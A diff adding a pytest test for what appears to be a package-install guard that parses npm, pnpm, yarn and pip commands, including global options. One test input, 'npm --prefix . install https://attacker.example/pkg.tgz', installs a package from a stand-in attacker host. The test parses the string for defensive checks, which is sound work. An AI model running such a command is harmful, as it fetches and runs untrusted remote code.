@@ -234,6 +234,32 @@ def test_parse_package_intent_skips_wrapper_flags_before_manager_detection() -> 
     assert pip_intent.targets[0].package_name == "flask"
 
 
+def test_parse_package_intent_supports_manager_global_options_before_guarded_subcommands(tmp_path: Path) -> None:
+    _write_text(tmp_path / "package.json", '{"name":"demo"}\n')
+
+    npm_intent = parse_package_intent(
+        "npm --prefix . install https://attacker.example/pkg.tgz",
+        workspace=tmp_path,
+    )
+    pnpm_intent = parse_package_intent("pnpm --dir . add minimist@1.2.8", workspace=tmp_path)
+    yarn_intent = parse_package_intent("yarn --cwd . workspace web add react@18.3.0", workspace=tmp_path)
+    pip_intent = parse_package_intent("pip --isolated install requests==2.32.3", workspace=tmp_path)
+
+    assert npm_intent is not None
+    assert npm_intent.package_manager == "npm"
+    assert npm_intent.targets[0].source_url == "https://attacker.example/pkg.tgz"
+    assert pnpm_intent is not None
+    assert pnpm_intent.package_manager == "pnpm"
+    assert pnpm_intent.targets[0].package_name == "minimist"
+    assert yarn_intent is not None
+    assert yarn_intent.package_manager == "yarn"
+    assert yarn_intent.notes == ("workspace:web",)
+    assert yarn_intent.targets[0].package_name == "react"
+    assert pip_intent is not None
+    assert pip_intent.package_manager == "pip"
+    assert pip_intent.targets[0].package_name == "requests"
+
+
 def test_parse_package_intent_poetry_and_pipenv_use_project_lockfile_context(tmp_path: Path) -> None:
     _write_text(tmp_path / "pyproject.toml", "[tool.poetry]\nname = 'demo'\n")
     _write_text(tmp_path / "poetry.lock", "[[package]]\nname='requests'\nversion='2.32.0'\n")
